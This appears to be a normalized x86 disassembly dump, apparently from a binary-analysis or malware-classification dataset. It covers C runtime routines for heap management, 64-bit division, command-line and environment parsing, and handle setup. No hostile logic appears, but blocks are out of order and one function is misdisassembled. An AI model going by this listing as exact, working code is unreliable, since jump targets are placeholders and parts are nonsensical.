mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_40523a
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_4051e4
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_4052fc
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_405353
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_40523a
pop ecx
sub_405398
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_4050a0
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_4055a0
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_4055a0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_406d90
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_4055a0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_4056c4
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_4056e0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_405750
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4057c5
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_407f69
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_407b4f
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40581d
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_407f69
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4034c4
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_40378f
pop ecx
push esi
call sub_403910
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_4033db
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_4034c4
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_403910
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_406ca0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_40378f
pop ecx
sub_4058d6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_407f69
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40596f
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4034c4
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40596f
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_40378f
pop ecx
sub_40596f
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_405b23
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4034c4
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4034c4
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_407380
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4033db
pop ecx
mov [ esp + 0x10 ] ebx
sub_405c55
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_4034c4
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_40378f
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_4034c4
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_405e11
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_405e4a
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_405e4a
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_405e4a
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_403910
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_403910
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_406ca0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_406ca0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_406cb0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_406cb0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_406cb0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_407f85
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_403910
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_4071c0
add esp 0x10
sub_405f9d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_407b20
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_406d90
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40602d
xchg ecx eax
inc eax
add cl ch
lahf
add [ eax ] al
add [ ebx - 0x7af0fe08 ] al
xchg esp eax
add [ eax ] al
add [ ecx ] bh
pop ebp
sbb [ ebp + 0x8 ] dh
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_407b20
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_406d90
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_4060e6
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
